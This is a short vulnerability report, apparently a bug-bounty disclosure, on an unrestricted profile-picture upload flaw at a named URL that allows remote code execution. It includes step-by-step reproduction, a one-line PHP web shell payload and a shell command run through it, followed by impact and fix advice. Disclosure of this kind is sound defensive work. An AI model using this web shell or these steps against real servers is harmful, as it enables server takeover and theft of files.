# Title

Unrestricted File Upload Leading to Remote Code Execution (RCE)

## Vulnerability Type

Remote Code Execution (RCE)

## Summary

The application allows users to upload a PHP file as a profile picture without proper server-side validation. The uploaded file is stored in a web-accessible directory and executed by the server, allowing arbitrary operating system commands to be executed.

The vulnerability was confirmed by uploading a PHP web shell and executing the `cat /etc/os-release` command.

## Vulnerable Endpoint

```http
https://kzlabs.in/1623.php
```

## Steps to Reproduce

1. Navigate to the following URL:

```text
https://kzlabs.in/1623.php
```

2. Login with valid credentials.
3. Go to **Profile**.
4. Upload a PHP file containing the following payload:

```php
<?php echo system($_GET['cmd']); ?>
```

5. After the upload succeeds, open the uploaded file in a new browser tab.
6. Append the following query parameter to the URL:

```text
?cmd=cat /etc/os-release
```

7. Observe that the command is executed and the server returns the output.

## Payload Used

```php
<?php echo system($_GET['cmd']); ?>
```

## Proof of Concept

The uploaded PHP file successfully executed the supplied command and returned the contents of:

```text
/etc/os-release
```

## Impact

* Remote Code Execution on the server
* Complete server compromise
* Unauthorized access to sensitive files
* Potential privilege escalation and full system takeover

## Recommendations for Fix

* Restrict uploads to approved image file types using server-side validation
* Prevent execution of uploaded files
* Store uploaded files outside the web root
* Disable execution of PHP scripts in upload directories
* Validate file content instead of relying on file extensions
